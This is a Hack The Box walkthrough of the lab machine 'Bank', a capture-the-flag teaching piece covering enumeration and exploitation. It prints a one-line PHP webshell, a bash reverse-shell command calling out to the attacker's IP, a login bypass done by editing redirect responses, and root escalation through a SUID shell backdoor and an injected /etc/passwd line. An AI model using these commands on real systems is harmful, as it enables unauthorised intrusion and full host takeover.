---
title: HTB: Bank
url: https://0xdf.gitlab.io/2020/07/07/htb-bank.html
date: 2020-07-07T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-bank, hackthebox, ctf, nmap, vhosts, dns, dig, zone-transfer, wfuzz, gobuster, burp, regex, burp-repeater, filter, suid, php, passwd
---

![Bank](https://0xdfimages.gitlab.io/img/bank-cover.png)

Bank was an pretty straight forward box, though two of the major steps had unintended alternative methods. I’ll enumerate DNS to find a hostname, and use that to access a bank website. I can either find creds in a directory of data, or bypass creds all together by looking at the data in the HTTP 302 redirects. From there, I’ll upload a PHP webshell, bypassing filters, and get a shell. To get root, I can find a backdoor SUID copy of dash left by the administrator, or exploit write privileges in /etc/passwd. In Beyond Root, I’ll look at the coding mistake in the 302 redirects, and show how I determined the SUID binary was dash.

## Box Info

| Name | [Bank](https://hackthebox.com/machines/bank)  [Bank](https://hackthebox.com/machines/bank) [Play on HackTheBox](https://hackthebox.com/machines/bank) |
| --- | --- |
| Release Date | 16 Jun 2017 |
| Retire Date | 16 Sep 2017 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Bank |
| Radar Graph | Radar chart for Bank |
| First Blood User | 00:33:37[ahmed ahmed](https://app.hackthebox.com/users/285) |
| First Blood Root | 00:45:21[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [makelarisjr makelarisjr](https://app.hackthebox.com/users/95) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), DNS (53), and HTTP (80), as well as DNS on UDP 53 as well:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 06:12 EDT
Nmap scan report for 10.10.10.29
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
root@kali# nmap -p 22,53,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 06:13 EDT
Nmap scan report for 10.10.10.29
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds

root@kali# nmap -p- -sU --min-rate 10000 -oA scans/nmap-alludp 10.10.10.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 06:17 EDT
Warning: 10.10.10.29 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.29
Host is up (0.016s latency).
Not shown: 65456 open|filtered ports, 78 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 72.94 seconds

```

Based on the OpenSSH and Apache versions, the host is likely running Ubunutu 14.04 Trusty.

### DNS - TCP/UDP 53

The first thing I check when I see TCP 53 is a zone transfer. I don’t see any hint of the host/domain name, so I’ll take a guess that it might be `bank.htb`, and that works:

```

root@kali# dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.16.3-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
;; Query time: 12 msec
;; SERVER: 10.10.10.29#53(10.10.10.29)
;; WHEN: Wed Jul 01 06:19:53 EDT 2020
;; XFR size: 6 records (messages 1, bytes 171)

```

I’ll add the following to my local `/etc/hosts` file:

```
10.10.10.29 bank.htb chris.bank.htb ns.bank.htb www.bank.htb

```

### Website by IP - TCP 80

The site is just the Apache2 default page:

![image-20200701062201229](https://0xdfimages.gitlab.io/img/image-20200701062201229.png)

I’ll run `gobuster` against the site, but find nothing as well.

Visiting `http://www.bank.htb`, `http://chris.bank.htb`, `http://ns.bank.htb` all lead to this site as well.

### Scan for Virtual Hosts

I did a quick scan for virtual hosts using `wfuzz`:

```

root@kali# wfuzz -u http://10.10.10.29/ -H "Host: FUZZ.bank.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 11510
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.29/
Total requests: 19983

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000009543:   400        12 L     53 W     421 Ch      "#www"
000010595:   400        12 L     53 W     421 Ch      "#mail"

Total time: 52.84697
Processed Requests: 19983
Filtered Requests: 19981
Requests/sec.: 378.1294

```

It didn’t find anything, but it is worth noting that other subdomains could be in use by the server in other capacities, just like `chris`, `www,` and `ns`, and they won’t show up here because they have the same default behavior at the webroot. But, nothing else to go on at this point.

### bank.htb - TCP 80

#### Site

Unlike the other subdomains, `bank.htb` redirects to `/login.php`, which presents a login form:

![image-20200701062632625](https://0xdfimages.gitlab.io/img/image-20200701062632625.png)

I tried some basic guessing (admin/admin, bank/bank, etc) and some basic SQLI enumeration (putting `'` into each field), but nothing interesting popped out.

#### Directory Brute Force

I’ll start a `gobuster` to look for additional pages, using the `-x php` flag since I observed the site was running PHP:

```

root@kali# gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o scans/gobuster-bank.htb-root-medium-php -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/01 06:34:48 Starting gobuster
===============================================================
/support.php (Status: 302)
/uploads (Status: 301)
/assets (Status: 301)
/logout.php (Status: 302)
/login.php (Status: 200)
/index.php (Status: 302)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2020/07/01 06:38:34 Finished
===============================================================

```

`/support.php` redirects to `login.php`.

`/uploads` redirects to `/uploads/` which returns a 403 forbidden.

`/assets` redirects to `/assets/` which has directory listing enabled, but I didn’t see anything terribly interesting.

`/inc` redirects to `/inc`/ which has four PHP files:

![image-20200701065235335](https://0xdfimages.gitlab.io/img/image-20200701065235335.png)

`header.php` returns a 302 to `login.php`, which results in the browser going to `/inc/login.php` which doesn’t exist. I suspect all of the pages have this header, which checks for a valid session, and then redirects if not. The other three return empty pages (which makes sense, as they are meant to be included).

#### Requests

I went into Burp to see how the site worked, and I noticed something weird - the 302 redirect on the root was pretty big in size:

![image-20200701064649584](https://0xdfimages.gitlab.io/img/image-20200701064649584.png)

Typically I expect that to be just the redirect with no body. Looking at the actual respond, it has HTML in it:

```

HTTP/1.1 302 Found
Date: Wed, 01 Jul 2020 10:31:28 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 7322
Connection: close
Content-Type: text/html

<div class="col-md-10">

    <div class="row">
        <div class="col-lg-3 col-md-6">
            <div class="panel panel-primary">
                <div class="panel-heading">
                    <div class="row">
                        <div class="col-xs-3">
                            <i class="fa fa-usd fa-5x">
...[snip]...

```

That’s strange and worth exploring further.

#### /balance-transfer

`/balance-transfer` provided a directory list with a lot of `.acc` files, each of which is 32 hex characters (MD5?):

![image-20200701065551820](https://0xdfimages.gitlab.io/img/image-20200701065551820.png)

Each file is a report the starts with `++OK ENCRYPT SUCCESS`, and then has several text fields, where the name, email, and password are base64 encoded strings:

```
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
===UserAccount===

```

I suspect the base64-encoded strings are the result of the encryption.

## Shell as www-data

### Login - Path #1

#### Find Creds

Especially in a CTF, there’s rarely a folder with hundreds of encrypted usernames and password that isn’t meant to show something. I wanted to look more at the files. I could use a recursive `wget` to get all the files, but first I started just using `curl` and the directory listing. I’ll use `head` to check it out:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | head -20
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /balance-transfer</title>
 </head>
 <body>
<h1>Index of /balance-transfer</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0a0b2b566c723fce6c5dc9544d426688.acc">0a0b2b566c723fce6c5dc9544d426688.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">583 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0a0bc61850b221f20d9f356913fe0fe7.acc">0a0bc61850b221f20d9f356913fe0fe7.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0a2f19f03367b83c54549e81edc2dd06.acc">0a2f19f03367b83c54549e81edc2dd06.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0a629f4d2a830c2ca6a744f6bab23707.acc">0a629f4d2a830c2ca6a744f6bab23707.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0a9014d0cc1912d4bd93264466fd1fad.acc">0a9014d0cc1912d4bd93264466fd1fad.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0ab1b48c05d1dbc484238cfb9e9267de.acc">0ab1b48c05d1dbc484238cfb9e9267de.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0abe2e8e5fa6e58cd9ce13037ff0e29b.acc">0abe2e8e5fa6e58cd9ce13037ff0e29b.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">583 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0b6ad026ef67069a09e383501f47bfee.acc">0b6ad026ef67069a09e383501f47bfee.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc">0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>

```

I can `grep` on `.acc` to get just the table rows showing files (`-F` so that `.` is an actual period and not a wildcard for any character). There are 999 files:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | wc -l
999

```

The date looked the same on all the lines. To verify, I ran the `curl` / `grep` above, but then added another `grep` to remove all the lines with that specific date string:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Fv '2017-06-15 09:50' | wc -l
0

```

Next I started looking at the size. This regex will get the filename through the size:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | head 
0a0b2b566c723fce6c5dc9544d426688.acc">0a0b2b566c723fce6c5dc9544d426688.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">583 
0a0bc61850b221f20d9f356913fe0fe7.acc">0a0bc61850b221f20d9f356913fe0fe7.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 
0a2f19f03367b83c54549e81edc2dd06.acc">0a2f19f03367b83c54549e81edc2dd06.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 
0a629f4d2a830c2ca6a744f6bab23707.acc">0a629f4d2a830c2ca6a744f6bab23707.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 
0a9014d0cc1912d4bd93264466fd1fad.acc">0a9014d0cc1912d4bd93264466fd1fad.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 
0ab1b48c05d1dbc484238cfb9e9267de.acc">0ab1b48c05d1dbc484238cfb9e9267de.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 
0abe2e8e5fa6e58cd9ce13037ff0e29b.acc">0abe2e8e5fa6e58cd9ce13037ff0e29b.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">583 
0b6ad026ef67069a09e383501f47bfee.acc">0b6ad026ef67069a09e383501f47bfee.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">585 
0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc">0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 
0b45913c924082d2c88a804a643a29c8.acc">0b45913c924082d2c88a804a643a29c8.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 

```

Now I can use `curl` and `tr` to clean that up and get just the filename and the size:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d'>' -f1,7 | tr '">' ' ' | head 
0a0b2b566c723fce6c5dc9544d426688.acc  583 
0a0bc61850b221f20d9f356913fe0fe7.acc  585 
0a2f19f03367b83c54549e81edc2dd06.acc  584 
0a629f4d2a830c2ca6a744f6bab23707.acc  584 
0a9014d0cc1912d4bd93264466fd1fad.acc  584 
0ab1b48c05d1dbc484238cfb9e9267de.acc  585 
0abe2e8e5fa6e58cd9ce13037ff0e29b.acc  583 
0b6ad026ef67069a09e383501f47bfee.acc  585 
0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc  584 
0b45913c924082d2c88a804a643a29c8.acc  584

```

If I sort that by size (`-k2` says sort based on the second column, and `-n` is numeric sort), something jumps out:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d'>' -f1,7 | tr '">' ' ' | sort -k2 -n | head
68576f20e9732f1b2edc4df5b8533230.acc  257 
09ed7588d1cd47ffca297cc7dac22c52.acc  581 
941e55bed0cb8052e7015e7133a5b9c7.acc  581 
052a101eac01ccbf5120996cdc60e76d.acc  582 
0d64f03e84187359907569a43c83bddc.acc  582 
10805eead8596309e32a6bfe102f7b2c.acc  582 
20fd5f9690efca3dc465097376b31dd6.acc  582 
346bf50f208571cd9d4c4ec7f8d0b4df.acc  582 
70b43acf0a3e285c423ee9267acaebb2.acc  582 
780a84585b62356360a9495d9ff3a485.acc  582 

```

257 is a much smaller size. If I look at all the sizes in a histogram, I can see all of the other files are between 581 and 585 bytes:

```

root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d'>' -f1,7 | tr '">' ' ' | cut -d' ' -f3 | sort | uniq -c
      1 257
      2 581
     11 582
     97 583
    590 584
    298 585

```

I’ll open that file, and it seems the encryption failed:

```

root@kali# curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===

```

That leaves a plaintext email and password.

An alternative way to find this pretty quickly is to download all the file with `wget -r http://bank.htb/balance-transfer/`. Now I can `grep` for files that don’t contain `++OK ENCRYPT SUCCESS` (with `-L` for show files that don’t contain):

```

root@kali# grep -L "++OK ENCRYPT SUCCESS" bank.htb/balance-transfer/*.acc
bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

```

#### Login

Now I can login as chris:

![image-20200701073231992](https://0xdfimages.gitlab.io/img/image-20200701073231992.png)

The dashboard has links to itself (`index.php`) as well as Support (`support.php`) and there’s a logout link made visible by clicking on Chris’ name at the top right.

`support.php` presents a form and open tickets:

![image-20200701073358067](https://0xdfimages.gitlab.io/img/image-20200701073358067.png)

### ByPass Login - Path #2

I noted in my reconnaissance that the 302 reidirects were returning a lot of content as well. I went into Burp, in the Proxy Options, and turned on Response Interception:

![image-20200701072723932](https://0xdfimages.gitlab.io/img/image-20200701072723932.png)

Now I refreshed `bank.htb`. I see the request go out, and Forward it. The response comes back and is intercepted as well:

![image-20200701072858425](https://0xdfimages.gitlab.io/img/image-20200701072858425.png)

I changed “302 Found” to “200 OK” and hit Forward. I can turn intercept off at this point, or manually allow the rest of the page requests to go through. The browser now shows `index.php`, though a lot of the formatting is busted, and some of the info is missing compared to what I got above when logging in:

![image-20200701073026145](https://0xdfimages.gitlab.io/img/image-20200701073026145.png)

`support.php` mostly loads as well:

![image-20200701073613986](https://0xdfimages.gitlab.io/img/image-20200701073613986.png)

The ticket submit works:

![image-20200701073737736](https://0xdfimages.gitlab.io/img/image-20200701073737736.png)

“Click Here” goes to the upload image.

Rather than having to manually edit each response, I added a rule in Proxy -> Options -> Match and Replace to look for 302s in the response headers and replace them with 200s:

![image-20200701074801816](https://0xdfimages.gitlab.io/img/image-20200701074801816.png)

I’ll make sure to turn this back off once I’m done or if I want to log in again.

### Upload Filter Enumeration

Since the ticket allows for upload, I’ll try to attach a simple PHP webshell, `cmd.php`:

```

<?php system($_REQUEST["cmd"]); ?>

```

I’ll want the extension to be `.php` so that it’ll be executed by the server. However, when I try to submit the ticket, it is rejected:

![image-20200701075224975](https://0xdfimages.gitlab.io/img/image-20200701075224975.png)

I’ll kick this POST request over to Burp Repeater and take a look:

![image-20200701075359233](https://0xdfimages.gitlab.io/img/image-20200701075359233.png)

The error is in the very last line of the response.

There are really three ways that a PHP site commonly blocks based on file type:
- file extension
- Content-Type header
- Mime type, looking at the starting bytes of the content itself and signature that

My first test was to change the extension to `.png` and resend. Unfortunately, success:

![image-20200701075707269](https://0xdfimages.gitlab.io/img/image-20200701075707269.png)

The other two methods are trivially bypassed (by changing the Content-Type header to that of an image and by starting the file out with the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) of an image and putting the PHP code later in the file). This one is more difficult. I can upload the webshell, but trying to visit the webshell just returns an error:

![image-20200701075845918](https://0xdfimages.gitlab.io/img/image-20200701075845918.png)

That’s because the server is trying to process it as an image, and not as PHP, so there’s no execution.

### Finding an Extension

I tried a handful of [other extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) that commonly will be executed as PHP, but all were blocked.

In looking the source for `support.php`, there’s a comment:

```

<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --

```

I changed the upload to `cmd.htb`, and it uploaded.

To test, I ran the `id` command, and it worked:

```

root@kali# curl http://bank.htb/uploads/cmd.htb?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

Now to get a shell, with `nc` listening on 443, I’ll issue the following command to the webshell:

```

root@kali# curl http://bank.htb/uploads/cmd.htb --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.41/443 0>&1"'

```

The connection comes back with a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.29.
Ncat: Connection from 10.10.10.29:53542.
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the shell to a PTY with the [standard technique](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/):

```

www-data@bank:/var/www/bank/uploads$ python -c 'import pty;pty.spawn("bash")'
python -c 'import pty;pty.spawn("bash")'
www-data@bank:/var/www/bank/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo
root@kali# nc -lnvp 443
                                                     reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@bank:/var/www/bank/uploads$ 

```

In the home directory of chris, I’ll find `user.txt`:

```

www-data@bank:/home/chris$ cat user.txt
37c97f86************************

```

## Priv: www-data –> root

There are two paths to root (in addition to surely some kernel exploits since this box is old). Both will be identified in [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) or [LinEnum](https://github.com/rebootuser/LinEnum), but I’ll show the commands to identify the vector.

### emergency - Path #1

#### Enumeration

One thing to look for is binaries with the Set UID flag active. These are executables that are configured such that they run not as the current user, but as the file’s owner. So when a binary is SUID and owned by root, it will run as root. If I can trick that file into running other commands, I have command execution as root.

A SUID binary will have an `s` instead of an `x` in the executable permission for the user in `ls -l` output, like this:

```

$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd

```

I can search for all SUID binaries owned by root on the system with this `find` command:

```

find / -type f -user root -perm -4000 2>/dev/null

```

That will:
- search all subdirectories of `/` (the entire file system)
- `-type f` - only return files
- `-user root` - only return files owned by root
- `-perm -4000` - files with SUID bit set
- `2>/dev/null` - don’t show errors

On Bank, it finds several items:

```

www-data@bank:/$ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount

```

The first one is particularly interesting and non-standard, `/var/htb/bin/emergency`.

#### Shell

Running `emergency` just returns a root shell:

```

www-data@bank:/$ /var/htb/bin/emergency                           
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

```

The admin must have left themself a backdoor. My effective uid is now root, which allows me to read `root.txt`:

```

# cat /root/root.txt
d5be56ad************************

```

### passwd - Path #2

#### Enumeration

Two of the files used to manage user account on a Linux box are `/etc/passwd` and `/etc/shadow`. `passwd` is readable by any user, but shadow typically holds the password hashes, and is only readable by root and members of the shadow group. In early versions of Linux, the password hashes were just stored in `passwd`, but that was determined to be a security risk once people started cracking hashes.

On a normal Linux install, the permissions for these files would look like:

```

root@kali# ls -l /etc/passwd /etc/shadow
-rw-r--r-- 1 root root   3297 Jun 22 16:19 /etc/passwd
-rw-r----- 1 root shadow 1839 Jun 22 16:19 /etc/shadow

```

However, on Bank, someone made `passwd` writable by anyone:

```

www-data@bank:/$ ls -l /etc/passwd /etc/shadow
-rw-rw-rw- 1 root root   1252 May 28  2017 /etc/passwd
-rw-r----- 1 root shadow  895 Jun 14  2017 /etc/shadow

```

This is a big problem.

#### Exploit passwd

Because `passwd` once held the hashes, it still can. Typically there’s an `x` where the hash would be, indicating that the hash is actually in `shadow`. But if I put a hash there, it will work.

I’ll add a user with userid and groupid 0, which makes that user root with a different password.

First I’ll generate a password hash for the password “0xdf” using `openssl`:

```

www-data@bank:/$ openssl passwd -1 0xdf
$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0

```

I’ll add a line to `/etc/passwd` using `echo`:

```

www-data@bank:/$ echo 'oxdf:$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0:0:0:pwned:/root:/bin/bash' >> /etc/passwd

```

The format of the line is colon separated username (can’t start with a digit), password hash, user id, group id, comment, home directory, shell.

With the user added, I can just `su` to that user, which returns as root:

```

www-data@bank:/$ su - oxdf
Password: 
root@bank:~#

```

## Beyond Root

### Redirect Failure

I was able to access the site without logging in because it was sending the requested pages in full as part of the 302 redirect response. As I guessed, each of the PHP pages on the site have the code `include './inc/header.php';`.

Looking at `header.php`, it includes a lot of the formatting and the top menu bar. It also does session management with this code:

```

session_name("HTBBankAuth");
session_start();

if(empty($_SESSION['username'])){
        header("location: login.php");
        return;
}

```

The problem here is the `return;`. [This function](https://www.php.net/manual/en/function.return.php) will:

> *return* returns program control to the calling module. Execution resumes at the expression following the called module’s invocation.

If this were in the main code, this would actually work. It does end processing of the rest of `header.php`, which is why when I bypassed the login, the page didn’t have the header bar or any of the CSS formatting. But it just returns to the calling page, and that page continues processing.

If I change that return to `exit;`, now visiting `http://bank.htb` returns a proper 302 message:

```

HTTP/1.1 302 Found
Date: Wed, 01 Jul 2020 12:48:58 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 0
Connection: close
Content-Type: text/html

```

### emergency

Interestingly enough, there’s more than just this one SUID file in `/var/htb`:

```

root@bank:/var/htb# find . -type f 
./emergency
./bin/emergency

```

The top `emergency` is a Python script:

```

#!/usr/bin/python
import os, sys

def close():
        print "Bye"
        sys.exit()

def getroot():
        try:
                print "Popping up root shell..";
                os.system("/var/htb/bin/emergency")
                close()
        except:
                sys.exit()

q1 = raw_input("[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: ");

if q1 == "y" or q1 == "yes":
        getroot()
else:
        close()

```

The second is an ELF file:

```

root@bank:/var/htb# file bin/emergency 
bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped

```

The Python script will run, and return a shell when I enter `y`:

```

www-data@bank:/var/htb$ ./emergency 
[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: y
Popping up root shell..
#

```

I was thinking I’d pull the binary back and reverse it a bit, but first I decided to check if it was known. I got the MD5 hash:

```

www-data@bank:/$ md5sum /var/htb/bin/emergency 
ffeed9b639c1a54700c5dc3f4972bba7  /var/htb/bin/emergency

```

Googling for it found two hits:

![image-20200701085212023](https://0xdfimages.gitlab.io/img/image-20200701085212023.png)

Both suggested the file name was `dash`, which is a shell. I checked, and the copy of `dash` on this box matched:

```

www-data@bank:/$ md5sum /var/htb/bin/emergency 
ffeed9b639c1a54700c5dc3f4972bba7  /var/htb/bin/emergency
www-data@bank:/$ md5sum /bin/dash 
ffeed9b639c1a54700c5dc3f4972bba7  /bin/dash

```